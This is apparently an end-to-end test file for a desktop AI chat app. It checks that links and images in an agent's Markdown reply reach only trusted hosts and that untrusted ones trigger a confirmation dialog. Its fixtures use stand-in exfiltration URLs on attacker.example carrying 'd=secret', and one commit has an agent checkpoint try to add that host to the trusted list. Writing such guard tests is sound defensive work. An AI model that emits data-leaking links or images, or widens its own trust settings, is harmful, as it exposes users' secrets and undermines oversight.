import fs from "node:fs";
import path from "node:path";
import { nativeGit } from "@catamorphic/git";
import { publishedRef } from "@catamorphic/workflow/project-layout";
import { afterAll, beforeAll, expect, it } from "vitest";
import { type AppHandle, launchApp, setReactValueJs } from "./harness.js";

/**
 * Links and images an agent writes reach only hosts the chat trusts without
 * asking (ADR 0277): Work's list, the project's published list, and hosts
 * the person trusted.
 */
let app: AppHandle;
const leak = "https://attacker.example/r?d=secret";
const chart = "https://attacker.example/c.png?d=secret";

const reply = (selector: string) =>
  `[...document.querySelectorAll('article:not([data-user-message]) ${selector}')]`;
const browserTabs = () =>
  app.eval<number>(
    `document.querySelectorAll('[data-tab-orientation] [data-point-key^="browser:"]').length`,
  );
/** A browser tab shows this address (opened, even if it cannot load). */
const showing = (fragment: string) =>
  `[...document.querySelectorAll('webview')].some((view) => { try { return view.getURL().includes(${JSON.stringify(fragment)}); } catch { return false; } })`;
const asking = () =>
  app.eval<boolean>(
    `!!document.querySelector('[data-testid="link-trust-dialog"]')`,
  );
/** A primary-modifier click: the link opens in a tab of its own. */
const clickLinkInNewTab = (href: string) =>
  app.eval(
    `(() => { const mac = /Mac/.test(navigator.platform); (${reply("a")}.find((a) => a.getAttribute('href') === ${JSON.stringify(href)})).dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, metaKey: mac, ctrlKey: !mac })); return true; })()`,
  );
const clickLink = (href: string) =>
  app.eval(
    `(${reply("a")}.find((a) => a.getAttribute('href') === ${JSON.stringify(href)})).click(), true`,
  );

beforeAll(async () => {
  app = await launchApp();
  await app.waitFor(`!!document.querySelector('[data-sidebar="left"]')`);
  const root = path.join(app.userDataDir, "trusted-hosts-project");
  await app.eval(
    `window.catamorphicDesktop.createProject({name:'Trusted hosts',rootPath:${JSON.stringify(root)}})`,
  );
  fs.mkdirSync(path.join(root, ".work"), { recursive: true });
  const manifest = path.join(root, ".work/project.json");
  const existing = fs.existsSync(manifest)
    ? JSON.parse(fs.readFileSync(manifest, "utf8"))
    : {};
  fs.writeFileSync(
    manifest,
    JSON.stringify({ ...existing, trustedHosts: ["docs.acme.test"] }),
  );
  // The project approved this list by publishing it. Checkpoints and the
  // working copy below can change without widening the shared approval.
  await nativeGit(root, ["init", "--initial-branch=main"]);
  await nativeGit(root, ["add", ".work/project.json"]);
  await nativeGit(root, [
    "-c",
    "user.name=Fixture",
    "-c",
    "user.email=fixture@example.test",
    "-c",
    "commit.gpgsign=false",
    "commit",
    "-m",
    "Publish trusted hosts",
  ]);
  const approved = (await nativeGit(root, ["rev-parse", "HEAD"])).trim();
  await nativeGit(root, ["update-ref", publishedRef(), approved]);
  fs.writeFileSync(
    manifest,
    JSON.stringify({
      ...existing,
      trustedHosts: ["docs.acme.test", "attacker.example"],
    }),
  );
  await nativeGit(root, ["add", ".work/project.json"]);
  await nativeGit(root, [
    "-c",
    "user.name=Fixture",
    "-c",
    "user.email=fixture@example.test",
    "-c",
    "commit.gpgsign=false",
    "commit",
    "-m",
    "Agent checkpoint proposes another host",
  ]);
  await app.reload();
  await app.waitFor(
    `!!document.querySelector('[data-dock-rail] button[aria-label="New chat"]')`,
  );
  await app.eval(
    `document.querySelector('[data-dock-rail] button[aria-label="New chat"]').click(), true`,
  );
  await app.waitFor(
    `[...document.querySelectorAll('[data-composer-input]')].some((el) => !el.closest('[inert]'))`,
    { timeoutMs: 20_000, label: "a chat" },
  );
  // The fake agent says back what it was sent, as Markdown.
  await app.eval(`(() => {
    ${setReactValueJs}
    const composer = [...document.querySelectorAll('[data-composer-input]')].find((el) => !el.closest('[inert]'));
    composer.focus();
    setReactValue(composer, ${JSON.stringify(
      `Read [the report](${leak}), [the guide](https://docs.acme.test/guide) and [the repo](https://github.com/acme/web). ![chart](${chart})`,
    )});
    composer.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true, cancelable: true }));
    return true;
  })()`);
  await app.waitFor(`${reply('[data-remote-image="waiting"]')}.length === 1`, {
    timeoutMs: 30_000,
    label: "the reply's image waits",
  });
}, 180_000);
afterAll(async () => {
  await app?.stop();
});

it("names the host of an image it may not load, and loads nothing", async () => {
  expect(
    await app.eval<string>(
      `${reply('[data-remote-image="waiting"]')}[0].textContent`,
    ),
  ).toContain("chart from attacker.example");
  expect(
    await app.eval<number>(
      `document.querySelectorAll('img[src*="attacker.example"]').length`,
    ),
  ).toBe(0);
});

it("asks before opening a link to a host it does not trust, and opens nothing on Cancel", async () => {
  const before = await browserTabs();
  await clickLink(leak);
  await app.waitFor(
    `document.querySelector('[data-testid="link-trust-dialog"]')?.textContent.includes('attacker.example')`,
    { label: "the link asks" },
  );
  expect(
    await app.eval<string>(
      `document.querySelector('[data-testid="link-trust-dialog"]').textContent`,
    ),
  ).toContain(leak);
  await app.eval(
    `[...document.querySelectorAll('[role="dialog"] button')].find((b) => b.textContent === 'Cancel').click(), true`,
  );
  await app.waitFor(
    `!document.querySelector('[data-testid="link-trust-dialog"]')`,
  );
  expect(await browserTabs()).toBe(before);
});

it("opens links to Work's hosts and the project's at once", async () => {
  await clickLink("https://github.com/acme/web");
  await app.waitFor(showing("github.com/acme/web"), {
    label: "GitHub opens without asking",
  });
  expect(await asking()).toBe(false);
  await clickLink("https://docs.acme.test/guide");
  await app.waitFor(showing("docs.acme.test/guide"), {
    label: "the project's host opens without asking",
  });
  expect(await asking()).toBe(false);
});

it("trusts a host from the prompt: its links open and its images load from then on", async () => {
  const before = await browserTabs();
  // A tab of its own, so the count shows it opened: offline, a page that
  // cannot load in a tab already showing one keeps that one's address.
  await clickLinkInNewTab(leak);
  await app.waitFor(
    `!!document.querySelector('[data-testid="link-trust-always"]')`,
  );
  await app.eval(
    `document.querySelector('[data-testid="link-trust-always"]').click(), true`,
  );
  await app.waitFor(
    `!document.querySelector('[data-testid="link-trust-dialog"]')`,
    { label: "the prompt closes" },
  );
  await app.waitFor(
    `document.querySelectorAll('[data-tab-orientation] [data-point-key^="browser:"]').length > ${before}`,
    { label: "trusted, the link opened in a tab of its own" },
  );
  // The image from that host loads now (or fails offline), no longer waiting.
  await app.waitFor(
    `${reply('[data-remote-image="waiting"]')}.length === 0 && ${reply("[data-remote-image]")}.length + ${reply("img")}.length > 0`,
    { label: "the image no longer waits" },
  );
  expect(app.getRendererErrors()).toEqual([]);
});
